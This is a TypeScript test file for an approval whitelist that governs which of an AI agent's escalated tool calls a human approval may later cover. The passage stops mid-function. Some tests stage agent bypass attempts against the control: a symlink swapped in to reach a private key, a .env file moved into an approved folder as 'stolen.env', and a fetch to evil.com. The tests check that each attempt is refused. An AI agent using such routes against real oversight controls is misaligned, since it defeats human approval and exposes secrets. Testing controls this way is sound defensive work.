/**
 * Tests for the approval whitelist: in-memory pattern store, constraint
 * matching, coverage of the escalated roles, and candidate extraction from
 * escalated tool calls.
 *
 * The later sections use the real PolicyEngine (and, end to end, the real
 * tool-call pipeline) for the regressions this module once had: a pattern
 * that constrained only the roles that escalated the approved call matched
 * later calls whose other roles escalated, the domain gate's escalation named
 * only the URL, and a git remote was bound by its name instead of where it
 * connects.
 */

import { describe, it, expect, beforeEach, afterEach, beforeAll, afterAll, vi } from 'vitest';
import { execFileSync, spawnSync } from 'node:child_process';
import { realpathSync, mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import type { CompiledPolicyFile, CompiledRule, CompiledRuleCondition, ToolAnnotation } from '../src/pipeline/types.js';
import type { ArgumentRole } from '../src/types/argument-roles.js';
import type { ToolCallRequest } from '../src/types/mcp.js';
import {
  createApprovalWhitelist,
  DEFAULT_WHITELIST_OPTIONS,
  directoryCandidateIndex,
  extractWhitelistCandidates,
  type ApprovalWhitelist,
  type WhitelistContext,
  type WhitelistPattern,
} from '../src/trusted-process/approval-whitelist.js';
import { PolicyEngine, evaluatedArguments } from '../src/trusted-process/policy-engine.js';
import type { EvaluationResult } from '../src/trusted-process/policy-types.js';
import {
  handleCallTool,
  type CallToolDeps,
  type ClientState,
  type ProxiedTool,
} from '../src/trusted-process/tool-call-pipeline.js';
import type { ResolvedSandboxConfig } from '../src/trusted-process/sandbox-integration.js';
import { withInputSchemas } from './fixtures/test-policy.js';

// ---------------------------------------------------------------------------
// Test helpers
// ---------------------------------------------------------------------------

const REAL_TMP = realpathSync('/tmp');
const posix = process.platform !== 'win32';
const gitAvailable = spawnSync('git', ['--version'], { stdio: 'ignore' }).status === 0;

function makeAnnotation(overrides: Partial<ToolAnnotation> = {}): ToolAnnotation {
  return {
    toolName: 'write_file',
    serverName: 'filesystem',
    comment: 'test',
    args: { path: ['write-path'], content: ['none'] },
    ...overrides,
  };
}

function makePattern(overrides: Partial<Omit<WhitelistPattern, 'id'>> = {}): Omit<WhitelistPattern, 'id'> {
  return {
    serverName: 'filesystem',
    toolName: 'write_file',
    // Stored directories are canonical (the stored side is never resolved again).
    constraints: [{ kind: 'directory', role: 'write-path', directory: REAL_TMP }],
    createdAt: new Date().toISOString(),
    sourceEscalationId: 'test-esc-1',
    originalReason: 'test reason',
    description: 'test pattern',
    ...overrides,
  };
}

/** A whitelist context naming the roles that escalated the call. */
function escalated(...roles: ArgumentRole[]): WhitelistContext {
  return { escalatedRoles: roles };
}

// ---------------------------------------------------------------------------
// createApprovalWhitelist: basic operations
// ---------------------------------------------------------------------------

describe('createApprovalWhitelist', () => {
  let whitelist: ApprovalWhitelist;

  beforeEach(() => {
    whitelist = createApprovalWhitelist();
  });

  it('starts empty', () => {
    expect(whitelist.size).toBe(0);
    expect(whitelist.entries()).toEqual([]);
  });

  it('adds a pattern and returns an id', () => {
    const id = whitelist.add(makePattern());
    expect(typeof id).toBe('string');
    expect(id.length).toBeGreaterThan(0);
    expect(whitelist.size).toBe(1);
    expect(whitelist.entries()).toHaveLength(1);
    expect(whitelist.entries()[0].id).toBe(id);
  });

  it('matches a pattern for the same server/tool with matching args', () => {
    const annotation = makeAnnotation();
    whitelist.add(makePattern());

    const result = whitelist.match(
      'filesystem',
      'write_file',
      { path: join(REAL_TMP, 'file.txt'), content: 'x' },
      annotation,
      escalated('write-path'),
    );
    expect(result.matched).toBe(true);
  });

  it('does not match a different tool', () => {
    const annotation = makeAnnotation({ toolName: 'read_file' });
    whitelist.add(makePattern());

    const result = whitelist.match('filesystem', 'read_file', { path: '/foo' }, annotation, escalated('write-path'));
    expect(result.matched).toBe(false);
  });

  it('does not match a different server', () => {
    const annotation = makeAnnotation({ serverName: 'other' });
    whitelist.add(makePattern());

    const result = whitelist.match('other', 'write_file', { path: '/foo' }, annotation, escalated('write-path'));
    expect(result.matched).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Directory constraint matching
// ---------------------------------------------------------------------------

describe('directory constraint matching', () => {
  let tmpDir: string;
  let whitelist: ApprovalWhitelist;

  beforeEach(() => {
    tmpDir = mkdtempSync(join(REAL_TMP, 'wl-test-'));
    mkdirSync(join(tmpDir, 'subdir'), { recursive: true });
    // Create a file so resolveRealPath works in matching
    writeFileSync(join(tmpDir, 'subdir', 'file.txt'), 'test');
    whitelist = createApprovalWhitelist();
  });

  afterEach(() => {
    rmSync(tmpDir, { recursive: true, force: true });
  });

  it('matches a path within the constrained directory', () => {
    const annotation = makeAnnotation();
    whitelist.add(
      makePattern({
        constraints: [{ kind: 'directory', role: 'write-path', directory: join(tmpDir, 'subdir') }],
      }),
    );

    const result = whitelist.match(
      'filesystem',
      'write_file',
      { path: join(tmpDir, 'subdir', 'file.txt'), content: 'x' },
      annotation,
      escalated('write-path'),
    );
    expect(result.matched).toBe(true);
  });

  it('rejects a path outside the constrained directory', () => {
    const annotation = makeAnnotation();
    writeFileSync(join(tmpDir, 'outside.txt'), 'test');
    whitelist.add(
      makePattern({
        constraints: [{ kind: 'directory', role: 'write-path', directory: join(tmpDir, 'subdir') }],
      }),
    );

    const result = whitelist.match(
      'filesystem',
      'write_file',
      { path: join(tmpDir, 'outside.txt'), content: 'x' },
      annotation,
      escalated('write-path'),
    );
    expect(result.matched).toBe(false);
  });

  it('matches an exact file in the directory', () => {
    const annotation = makeAnnotation();
    whitelist.add(
      makePattern({
        constraints: [{ kind: 'directory', role: 'write-path', directory: tmpDir }],
      }),
    );

    const result = whitelist.match(
      'filesystem',
      'write_file',
      { path: join(tmpDir, 'subdir', 'file.txt'), content: 'x' },
      annotation,
      escalated('write-path'),
    );
    expect(result.matched).toBe(true);
  });

  it.skipIf(!posix)('does not follow a symlink swapped in for the approved directory later', () => {
    // Approved: everything under subdir. The agent then replaces subdir with a
    // link to a directory that was never approved.
    const annotation = makeAnnotation({ toolName: 'read_text_file', args: { path: ['read-path'] } });
    const approvedDir = join(tmpDir, 'subdir');
    whitelist.add(
      makePattern({
        toolName: 'read_text_file',
        constraints: [{ kind: 'directory', role: 'read-path', directory: approvedDir }],
      }),
    );
    const secrets = join(tmpDir, 'secrets');
    mkdirSync(secrets);
    writeFileSync(join(secrets, 'id_ed25519'), 'key');
    rmSync(approvedDir, { recursive: true });
    symlinkSync(secrets, approvedDir);

    const result = whitelist.match(
      'filesystem',
      'read_text_file',
      { path: join(approvedDir, 'id_ed25519') },
      annotation,
      escalated('read-path'),
    );
    expect(result.matched).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Exact path constraint matching
// ---------------------------------------------------------------------------

describe('path constraint matching', () => {
  let tmpDir: string;
  let whitelist: ApprovalWhitelist;
  const annotation = makeAnnotation({ toolName: 'read_text_file', args: { path: ['read-path'] } });
  const read = (path: string) =>
    whitelist.match('filesystem', 'read_text_file', { path }, annotation, escalated('read-path')).matched;

  beforeEach(() => {
    tmpDir = mkdtempSync(join(REAL_TMP, 'wl-path-'));
    mkdirSync(join(tmpDir, 'notes'));
    writeFileSync(join(tmpDir, 'notes', 'a.txt'), 'a');
    writeFileSync(join(tmpDir, 'notes', 'b.txt'), 'b');
    whitelist = createApprovalWhitelist();
    whitelist.add(
      makePattern({
        toolName: 'read_text_file',
        constraints: [{ kind: 'path', role: 'read-path', path: join(tmpDir, 'notes', 'a.txt') }],
      }),
    );
  });

  afterEach(() => {
    rmSync(tmpDir, { recursive: true, force: true });
  });

  it('matches the approved path, however it is spelled, and nothing beside or below it', () => {
    expect(read(join(tmpDir, 'notes', 'a.txt'))).toBe(true);
    expect(read(`${tmpDir}/notes/./x/../a.txt`)).toBe(true);
    expect(read(join(tmpDir, 'notes', 'b.txt'))).toBe(false);
    expect(read(join(tmpDir, 'notes'))).toBe(false);
    expect(read(join(tmpDir, 'notes', 'a.txt', 'child'))).toBe(false);
    expect(read(join(tmpDir, 'notes', 'a.txt.bak'))).toBe(false);
  });

  it.skipIf(!posix)('does not follow a symlink swapped in for the approved file later', () => {
    writeFileSync(join(tmpDir, 'secret'), 'secret');
    rmSync(join(tmpDir, 'notes', 'a.txt'));
    symlinkSync(join(tmpDir, 'secret'), join(tmpDir, 'notes', 'a.txt'));
    expect(read(join(tmpDir, 'notes', 'a.txt'))).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Domain constraint matching
// ---------------------------------------------------------------------------

describe('domain constraint matching', () => {
  let whitelist: ApprovalWhitelist;
  const annotation = makeAnnotation({
    toolName: 'http_fetch',
    serverName: 'fetch',
    args: { url: ['fetch-url'] },
  });

  beforeEach(() => {
    whitelist = createApprovalWhitelist();
    whitelist.add(
      makePattern({
        serverName: 'fetch',
        toolName: 'http_fetch',
        constraints: [{ kind: 'domain', role: 'fetch-url', domain: 'api.example.com' }],
      }),
    );
  });

  it('matches the exact domain', () => {
    const result = whitelist.match(
      'fetch',
      'http_fetch',
      { url: 'https://api.example.com/data' },
      annotation,
      escalated('fetch-url'),
    );
    expect(result.matched).toBe(true);
  });

  it('rejects a different domain', () => {
    const result = whitelist.match(
      'fetch',
      'http_fetch',
      { url: 'https://evil.com/data' },
      annotation,
      escalated('fetch-url'),
    );
    expect(result.matched).toBe(false);
  });

  it('compares the canonical host, whatever the spelling', () => {
    const result = whitelist.match(
      'fetch',
      'http_fetch',
      { url: 'HTTPS://API.EXAMPLE.COM/other' },
      annotation,
      escalated('fetch-url'),
    );
    expect(result.matched).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Exact (identifier) constraint matching
// ---------------------------------------------------------------------------

describe('exact constraint matching', () => {
  let whitelist: ApprovalWhitelist;
  const annotation = makeAnnotation({
    toolName: 'create_issue',
    serverName: 'github',
    args: { owner: ['github-owner'], repo: ['github-repo'] },
  });

  beforeEach(() => {
    whitelist = createApprovalWhitelist();
    whitelist.add(
      makePattern({
        serverName: 'github',
        toolName: 'create_issue',
        constraints: [{ kind: 'exact', role: 'github-owner', value: 'myorg' }],
      }),
    );
  });

  it('matches case-insensitively', () => {
    const result = whitelist.match(
      'github',
      'create_issue',
      { owner: 'MyOrg', repo: 'repo' },
      annotation,
      escalated('github-owner'),
    );
    expect(result.matched).toBe(true);
  });

  it('rejects a different value', () => {
    const result = whitelist.match(
      'github',
      'create_issue',
      { owner: 'otherorg', repo: 'repo' },
      annotation,
      escalated('github-owner'),
    );
    expect(result.matched).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Zero-constraint patterns
// ---------------------------------------------------------------------------

describe('zero-constraint patterns', () => {
  it('rejects zero-constraint patterns in add()', () => {
    const whitelist = createApprovalWhitelist();
    expect(() => whitelist.add(makePattern({ constraints: [] }))).toThrow(
      /Refusing to add zero-constraint whitelist pattern/,
    );
    expect(whitelist.size).toBe(0);
  });
});

// ---------------------------------------------------------------------------
// Coverage: a pattern must constrain every role that escalated the call
// ---------------------------------------------------------------------------

describe('coverage of escalated roles', () => {
  let tmpDir: string;
  let whitelist: ApprovalWhitelist;
  const moveAnnotation = makeAnnotation({
    toolName: 'move_file',
    args: { source: ['read-path', 'delete-path'], destination: ['write-path'] },
  });

  beforeEach(() => {
    tmpDir = mkdtempSync(join(REAL_TMP, 'wl-cover-'));
    mkdirSync(join(tmpDir, 'docs'));
    mkdirSync(join(tmpDir, 'secrets'));
    whitelist = createApprovalWhitelist();
    whitelist.add(
      makePattern({
        toolName: 'move_file',
        constraints: [{ kind: 'directory', role: 'write-path', directory: join(tmpDir, 'docs') }],
      }),
    );
  });

  afterEach(() => {
    rmSync(tmpDir, { recursive: true, force: true });
  });

  const args = (): Record<string, unknown> => ({
    source: join(tmpDir, 'secrets', '.env'),
    destination: join(tmpDir, 'docs', 'stolen.env'),
  });

  it('matches when the pattern constrains every escalated role', () => {
    const result = whitelist.match('filesystem', 'move_file', args(), moveAnnotation, escalated('write-path'));
    expect(result.matched).toBe(true);
  });

  it('does not match when another role escalated too', () => {
    for (const roles of [['read-path'], ['delete-path'], ['read-path', 'delete-path']] as ArgumentRole[][]) {
      const result = whitelist.match(
        'filesystem',
        'move_file',
        args(),
        moveAnnotation,
        escalated('write-path', ...roles),
      );
      expect(result.matched).toBe(false);
    }
  });

  it('requires every resource role to be constrained when the escalated roles are unknown', () => {
    for (const context of [{ escalatedRoles: undefined }, { escalatedRoles: [] }]) {
      expect(whitelist.match('filesystem', 'move_file', args(), moveAnnotation, context).matched).toBe(false);
    }

    const full = createApprovalWhitelist();
    full.add(
      makePattern({
        toolName: 'move_file',
        constraints: [
          { kind: 'directory', role: 'read-path', directory: join(tmpDir, 'secrets') },
          { kind: 'directory', role: 'delete-path', directory: join(tmpDir, 'secrets') },
          { kind: 'directory', role: 'write-path', directory: join(tmpDir, 'docs') },
        ],
      }),
    );
    expect(full.match('filesystem', 'move_file', args(), moveAnnotation, { escalatedRoles: undefined }).matched).toBe(
      true,
    );
  });

  it('still requires every constraint of the pattern to hold', () => {
    const both = createApprovalWhitelist();
    both.add(
      makePattern({
        toolName: 'move_file',
        constraints: [
          { kind: 'directory', role: 'read-path', directory: join(tmpDir, 'docs') },
          { kind: 'directory', role: 'write-path', directory: join(tmpDir, 'docs') },
        ],
      }),
    );
    // read-path did not escalate this time, but the pattern's read-path constraint still applies.
    expect(both.match('filesystem', 'move_file', args(), moveAnnotation, escalated('write-path')).matched).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// extractWhitelistCandidates
// ---------------------------------------------------------------------------

describe('extractWhitelistCandidates', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = mkdtempSync(join(REAL_TMP, 'wl-cand-'));
    mkdirSync(join(tmpDir, 'docs'), { recursive: true });
    writeFileSync(join(tmpDir, 'docs', 'readme.md'), 'test');
  });

  afterEach(() => {
    rmSync(tmpDir, { recursive: true, force: true });
  });

  it('offers the exact path first and its directory, labelled recursive, second', () => {
    const annotation = makeAnnotation();
    const file = join(tmpDir, 'docs', 'readme.md');
    const { patterns, ipcs } = extractWhitelistCandidates(
      'filesystem',
      'write_file',
      { path: file, content: 'x' },
      annotation,
      escalated('write-path'),
      'esc-1',
      'test reason',
    );

    expect(patterns.map((p) => p.constraints)).toEqual([
      [{ kind: 'path', role: 'write-path', path: file }],
      [{ kind: 'directory', role: 'write-path', directory: join(tmpDir, 'docs') }],
    ]);
    // Each candidate carries the key of its own pattern (WP-122 groups by the first).
    expect(ipcs).toEqual([
      {
        description: `Allow filesystem/write_file write-path ${file}`,
        scope: 'exact',
        patternKey: JSON.stringify(['filesystem', 'write_file', [['path', 'write-path', file]]]),
      },
      {
        description: `Allow filesystem/write_file write-path within ${join(tmpDir, 'docs')} (recursive)`,
        scope: 'directory',
        patternKey: JSON.stringify(['filesystem', 'write_file', [['directory', 'write-path', join(tmpDir, 'docs')]]]),
      },
    ]);
    expect(patterns.map((p) => p.description)).toEqual(ipcs.map((ipc) => ipc.description));
  });

  it('generates a domain constraint for URL roles', () => {
    const annotation = makeAnnotation({
      toolName: 'http_fetch',
      serverName: 'fetch',
      args: { url: ['fetch-url'] },
    });

    const { patterns } = extractWhitelistCandidates(
      'fetch',
      'http_fetch',
      { url: 'https://api.example.com/v1/data' },
      annotation,
      escalated('fetch-url'),
      'esc-2',
      'test reason',
    );

    expect(patterns).toHaveLength(1);
    expect(patterns[0].constraints).toHaveLength(1);
    expect(patterns[0].constraints[0].kind).toBe('domain');
    expect((patterns[0].constraints[0] as { domain: string }).domain).toBe('api.example.com');
  });

  it('offers no candidate for a destination that cannot be shown in full', () => {
    const annotation = makeAnnotation({
      toolName: 'http_fetch',
      serverName: 'fetch',
      args: { url: ['fetch-url'] },
    });

    const { patterns, ipcs } = extractWhitelistCandidates(
      'fetch',
      'http_fetch',
      { url: 'not a url \u001b[31m' },
      annotation,
      escalated('fetch-url'),
      'esc-2b',
      'test reason',
    );
    expect(patterns).toHaveLength(0);
    expect(ipcs).toHaveLength(0);
  });

  it('generates an exact constraint for identifier roles', () => {
    const annotation = makeAnnotation({
      toolName: 'create_issue',
      serverName: 'github',
      args: { owner: ['github-owner'], repo: ['github-repo'] },
    });

    const { patterns } = extractWhitelistCandidates(
      'github',
      'create_issue',
      { owner: 'MyOrg', repo: 'my-repo' },
      annotation,
      escalated('github-owner'),
      'esc-3',
      'test reason',
    );

    expect(patterns).toHaveLength(1);
    expect(patterns[0].constraints).toHaveLength(1);
    expect(patterns[0].constraints[0].kind).toBe('exact');
    // Identifier values are lowercased
    expect((patterns[0].constraints[0] as { value: string }).value).toBe('myorg');
  });

  it('excludes write-history roles from directory generalization', () => {
    const annotation = makeAnnotation({
      toolName: 'git_reset',
      serverName: 'git',
      args: { path: ['read-path', 'write-history'], mode: ['none'] },
    });

    const { patterns } = extractWhitelistCandidates(
      'git',
      'git_reset',
      { path: join(tmpDir, 'docs', 'readme.md'), mode: 'hard' },
      annotation,
      escalated('write-history'),
      'esc-4',
      'test reason',
    );

    // write-history is excluded, so no constraints → no patterns offered
    expect(patterns).toHaveLength(0);
  });

  it('excludes delete-history roles from directory generalization', () => {
    const annotation = makeAnnotation({
      toolName: 'git_branch',
      serverName: 'git',
      args: { path: ['read-path', 'delete-history'], name: ['branch-name'] },
    });

    const { patterns } = extractWhitelistCandidates(
      'git',
      'git_branch',
      { path: join(tmpDir, 'docs', 'readme.md'), name: 'feature-x' },
      annotation,
      escalated('delete-history'),
      'esc-5',
      'test reason',
    );

    // delete-history is excluded, so no constraints → no patterns offered
    expect(patterns).toHaveLength(0);
  });

  it('offers no candidate when a history role escalated next to a path role', () => {
    // The read-path constraint alone could never discharge a call whose
    // write-history role escalates, so the candidate would only mislead.
    const annotation = makeAnnotation({
      toolName: 'git_reset',
      serverName: 'git',
      args: { path: ['read-path', 'write-history'], mode: ['none'] },
    });

    const { patterns, ipcs } = extractWhitelistCandidates(
      'git',
      'git_reset',
      { path: join(tmpDir, 'docs', 'readme.md'), mode: 'hard' },
      annotation,
      escalated('read-path', 'write-history'),
      'esc-5b',
      'test reason',
    );
    expect(patterns).toHaveLength(0);
    expect(ipcs).toHaveLength(0);
  });

  it('offers no candidate when an escalated role has no value', () => {
    const annotation = makeAnnotation({
      toolName: 'create_repository',
      serverName: 'github',
      args: { name: ['github-repo'], organization: ['github-owner'] },
    });

    const { patterns } = extractWhitelistCandidates(
      'github',
      'create_repository',
      { name: 'new-repo' },
      annotation,
      escalated('github-repo', 'github-owner'),
      'esc-5c',
      'test reason',
    );
    expect(patterns).toHaveLength(0);
  });

  it('falls back to all resource roles when escalatedRoles is undefined', () => {
    const annotation = makeAnnotation();
    const { patterns } = extractWhitelistCandidates(
      'filesystem',
      'write_file',
      { path: join(tmpDir, 'docs', 'readme.md'), content: 'x' },
      annotation,
      { escalatedRoles: undefined },
      'esc-6',
      'test reason',
    );

    // Should still produce path constraints from the write-path role: exact first, then the directory
    expect(patterns[0].constraints.length).toBeGreaterThanOrEqual(1);
    expect(patterns[0].constraints[0].kind).toBe('path');
    expect(patterns[1].constraints[0].kind).toBe('directory');
  });

  it('returns no patterns when no values are extractable', () => {
    const annotation = makeAnnotation({ args: {} });
    const { patterns, ipcs } = extractWhitelistCandidates(
      'filesystem',
      'write_file',
      {},
      annotation,
      escalated('write-path'),
      'esc-7',
      'test reason',
    );

    // Zero constraints → no whitelist candidate offered
    expect(patterns).toHaveLength(0);
    expect(ipcs).toHaveLength(0);
  });

  it('returns no patterns when args are missing', () => {
    const annotation = makeAnnotation();
    const { patterns, ipcs } = extractWhitelistCandidates(
      'filesystem',
      'write_file',
      { content: 'x' }, // path is missing
      annotation,
      escalated('write-path'),
      'esc-8',
      'test reason',
    );

    // Zero constraints → no whitelist candidate offered
    expect(patterns).toHaveLength(0);
    expect(ipcs).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// Multiple constraints (AND semantics)
// ---------------------------------------------------------------------------

describe('multiple constraints AND semantics', () => {
  it('requires all constraints to match', () => {
    const whitelist = createApprovalWhitelist();
    const annotation = makeAnnotation({
      toolName: 'create_issue',
      serverName: 'github',
      args: { owner: ['github-owner'], repo: ['github-repo'] },
    });

    whitelist.add(
      makePattern({
        serverName: 'github',
        toolName: 'create_issue',
        constraints: [
          { kind: 'exact', role: 'github-owner', value: 'myorg' },
          { kind: 'exact', role: 'github-repo', value: 'myrepo' },
        ],
      }),
    );
    const context = escalated('github-owner', 'github-repo');

    // Both match
    const match = whitelist.match('github', 'create_issue', { owner: 'myorg', repo: 'myrepo' }, annotation, context);
    expect(match.matched).toBe(true);

    // Only owner matches
    const noMatch = whitelist.match('github', 'create_issue', { owner: 'myorg', repo: 'other' }, annotation, context);
    expect(noMatch.matched).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// One role with values in several places: constraints of a role are alternatives
// ---------------------------------------------------------------------------

describe('a role whose values span several directories', () => {
  let tmpDir: string;
  const annotation = makeAnnotation({
    toolName: 'read_multiple_files',
    args: { paths: ['read-path'] },
  });
  const file = (...parts: string[]) => join(tmpDir, ...parts);

  beforeEach(() => {
    tmpDir = mkdtempSync(join(REAL_TMP, 'wl-multi-'));
    for (const dir of ['d1', 'd2', 'd3']) mkdirSync(join(tmpDir, dir));
    for (const name of ['d1/a', 'd1/c', 'd2/b', 'd2/e', 'd3/z']) writeFileSync(join(tmpDir, name), name);
  });

  afterEach(() => {
    rmSync(tmpDir, { recursive: true, force: true });
  });

  function candidatesFor(paths: string[]) {
    return extractWhitelistCandidates(
      'filesystem',
      'read_multiple_files',
      { paths },
      annotation,
      escalated('read-path'),
      'esc-multi',
      'test reason',
    );
  }

  function matcher(pattern: Omit<WhitelistPattern, 'id'>) {
    const whitelist = createApprovalWhitelist();
    whitelist.add(pattern);
    return (paths: string[]) =>
      whitelist.match('filesystem', 'read_multiple_files', { paths }, annotation, escalated('read-path')).matched;
  }

  it('offers candidates that discharge the very call they came from', () => {
    const approved = [file('d1', 'a'), file('d2', 'b')];
    const { patterns, ipcs } = candidatesFor(approved);
    expect(ipcs.map((ipc) => ipc.scope)).toEqual(['exact', 'directory']);
    for (const pattern of patterns) expect(matcher(pattern)(approved)).toBe(true);
  });

  it('exact: matches the approved files, in any order or subset, and no other file', () => {
    const exact = matcher(candidatesFor([file('d1', 'a'), file('d2', 'b')]).patterns[0]);
    expect(exact([file('d2', 'b'), file('d1', 'a')])).toBe(true);
    expect(exact([file('d1', 'a')])).toBe(true);
    expect(exact([file('d1', 'a'), file('d1', 'c')])).toBe(false);
    expect(exact([file('d2', 'e')])).toBe(false);
  });

  it('directory-wide: matches files in either approved directory, and none elsewhere', () => {
    const directory = matcher(candidatesFor([file('d1', 'a'), file('d2', 'b')]).patterns[1]);
    expect(directory([file('d1', 'c'), file('d2', 'e')])).toBe(true);
    expect(directory([file('d2', 'e')])).toBe(true);
    expect(directory([file('d1', 'c'), file('d3', 'z')])).toBe(false);
  });

  it('still requires every role the pattern constrains', () => {
    const moveAnnotation = makeAnnotation({
      toolName: 'move_file',
      args: { source: ['read-path', 'delete-path'], destination: ['write-path'] },
    });
    const whitelist = createApprovalWhitelist();
    whitelist.add(
      makePattern({
        toolName: 'move_file',
        constraints: [
          { kind: 'path', role: 'read-path', path: file('d1', 'a') },
          { kind: 'path', role: 'read-path', path: file('d2', 'b') },
          { kind: 'path', role: 'write-path', path: file('d3', 'z') },
        ],
      }),
    );
    const move = (source: string, destination: string) =>
      whitelist.match('filesystem', 'move_file', { source, destination }, moveAnnotation, escalated('read-path'))
        .matched;
    expect(move(file('d2', 'b'), file('d3', 'z'))).toBe(true);
    // A read-path alternative cannot stand in for the write-path constraint.
    expect(move(file('d2', 'b'), file('d1', 'a'))).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// constraintMatches when no values match the role
// ---------------------------------------------------------------------------

describe('constraint matching with no matching role values', () => {
  it('returns false when args have no values for the constraint role', () => {
    const whitelist = createApprovalWhitelist();
    const annotation = makeAnnotation({
      args: { content: ['none'] }, // no write-path args
    });

    whitelist.add(
      makePattern({
        constraints: [{ kind: 'directory', role: 'write-path', directory: '/some/dir' }],
      }),
    );

    const result = whitelist.match('filesystem', 'write_file', { content: 'x' }, annotation, escalated('write-path'));
    expect(result.matched).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Constraint deduplication
// ---------------------------------------------------------------------------

describe('constraint deduplication', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = mkdtempSync(join(REAL_TMP, 'wl-dedup-'));
    mkdirSync(join(tmpDir, 'dir'), { recursive: true });
    writeFileSync(join(tmpDir, 'dir', 'a.txt'), 'a');
    writeFileSync(join(tmpDir, 'dir', 'b.txt'), 'b');
  });

  afterEach(() => {
    rmSync(tmpDir, { recursive: true, force: true });
  });

  it('deduplicates identical constraints from multiple args in the same directory', () => {
    // edit_file has both read-path and write-path on the same 'path' arg
    const annotation = makeAnnotation({
      toolName: 'edit_file',
      serverName: 'filesystem',
      args: { path: ['read-path', 'write-path'] },
    });

    const { patterns } = extractWhitelistCandidates(
      'filesystem',
      'edit_file',
      { path: join(tmpDir, 'dir', 'a.txt') },
      annotation,
      escalated('read-path', 'write-path'),
      'esc-dedup',
      'test reason',
    );

    // read-path and write-path both name the same file (and directory),
    // but they have different roles so they should NOT be deduped
    expect(patterns[0].constraints.filter((c) => c.kind === 'path')).toHaveLength(2);
    expect(patterns[1].constraints.filter((c) => c.kind === 'directory')).toHaveLength(2);
  });

  it('deduplicates one role naming the same file twice, and keeps both directories of a role', () => {
    const annotation = makeAnnotation({
      toolName: 'read_multiple_files',
      serverName: 'filesystem',
      args: { paths: ['read-path'] },
    });
    mkdirSync(join(tmpDir, 'other'));
    writeFileSync(join(tmpDir, 'other', 'c.txt'), 'c');

    const { patterns } = extractWhitelistCandidates(
      'filesystem',
      'read_multiple_files',
      { paths: [join(tmpDir, 'dir', 'a.txt'), join(tmpDir, 'dir', 'a.txt'), join(tmpDir, 'other', 'c.txt')] },
      annotation,
      escalated('read-path'),
      'esc-dedup-2',
      'test reason',
    );

    expect(patterns.map((p) => p.constraints)).toEqual([
      [
        { kind: 'path', role: 'read-path', path: join(tmpDir, 'dir', 'a.txt') },
        { kind: 'path', role: 'read-path', path: join(tmpDir, 'other', 'c.txt') },
      ],
      [
        { kind: 'directory', role: 'read-path', directory: join(tmpDir, 'dir') },
        { kind: 'directory', role: 'read-path', directory: join(tmpDir, 'other') },
      ],
    ]);
  });
});

// ---------------------------------------------------------------------------
// Description includes role name
// ---------------------------------------------------------------------------

describe('buildDescription includes role names', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = mkdtempSync(join(REAL_TMP, 'wl-desc-'));
    mkdirSync(join(tmpDir, 'docs'), { recursive: true });
    writeFileSync(join(tmpDir, 'docs', 'file.txt'), 'test');
  });

  afterEach(() => {
    rmSync(tmpDir, { recursive: true, force: true });
  });

  it('includes role name in path and directory constraint descriptions', () => {
    const annotation = makeAnnotation();
    const { ipcs } = extractWhitelistCandidates(
      'filesystem',
      'write_file',
      { path: join(tmpDir, 'docs', 'file.txt'), content: 'x' },
      annotation,
      escalated('write-path'),
      'esc-desc-1',
      'test reason',
    );

    expect(ipcs[0].description).toContain(`write-path ${join(tmpDir, 'docs', 'file.txt')}`);
    expect(ipcs[1].description).toContain(`write-path within ${join(tmpDir, 'docs')} (recursive)`);
  });

  it('includes role name in domain constraint description', () => {
    const annotation = makeAnnotation({
      toolName: 'http_fetch',
      serverName: 'fetch',
      args: { url: ['fetch-url'] },
    });

    const { ipcs } = extractWhitelistCandidates(
      'fetch',
      'http_fetch',
      { url: 'https://api.example.com/data' },
      annotation,
      escalated('fetch-url'),
      'esc-desc-2',
      'test reason',
    );

    expect(ipcs[0].description).toContain('fetch-url domain');
  });
});

// ---------------------------------------------------------------------------
// Negative / non-integer whitelistSelection index handling
// ---------------------------------------------------------------------------

describe('whitelistSelection bounds safety', () => {
  it('negative index does not select a pattern', () => {
    const patterns = [makePattern({ description: 'candidate-0' })];

    // Simulate the bounds check used in mcp-proxy-server and index.ts
    const selection = -1 as number;
    const isValid = selection >= 0 && selection < patterns.length;
    expect(isValid).toBe(false);

    // Verify array access with negative index gives undefined
    expect(patterns[selection]).toBeUndefined();
  });

  it('non-integer index does not pass Number.isInteger check', () => {
    expect(Number.isInteger(1.5)).toBe(false);
    expect(Number.isInteger(0)).toBe(true);
    expect(Number.isInteger(-1)).toBe(true);
  });

  it('string coerced to number would fail typeof check', () => {
    // This tests the validation in readEscalationResponse
    const rawValue: unknown = '0';
    expect(typeof rawValue === 'number').toBe(false);
  });
});

// ---------------------------------------------------------------------------
// With the real policy engine
// ---------------------------------------------------------------------------

/** The whitelist's view of one call, as the pipeline builds it. */
interface WhitelistView {
  readonly evaluation: EvaluationResult;
  readonly annotation: ToolAnnotation;
  readonly args: Record<string, unknown>;
  readonly context: WhitelistContext;
}

function viewOf(engine: PolicyEngine, allowedDirectory: string, request: ToolCallRequest): WhitelistView {
  const annotation = engine.getAnnotation(request.serverName, request.toolName, request.arguments);
  if (!annotation) throw new Error(`no annotation for ${request.toolName}`);
  const evaluation = engine.evaluate(request);
  return {
    evaluation,
    annotation,
    args: evaluatedArguments(request.serverName, request.toolName, request.arguments, annotation),
    context: { escalatedRoles: evaluation.escalatedRoles, allowedDirectory },
  };
}

/** The candidate the approver would be offered for an escalated call. */
function candidateFor(view: WhitelistView, request: ToolCallRequest) {
  expect(view.evaluation.decision).toBe('escalate');
  return extractWhitelistCandidates(
    request.serverName,
    request.toolName,
    view.args,
    view.annotation,
    view.context,
    'esc',
    view.evaluation.reason,
  );
}

/** Whether the whitelist would discharge this call's escalation (false when it does not escalate). */
function whitelisted(whitelist: ApprovalWhitelist, view: WhitelistView, request: ToolCallRequest): boolean {
  if (view.evaluation.decision !== 'escalate') return false;
  return whitelist.match(request.serverName, request.toolName, view.args, view.annotation, view.context).matched;
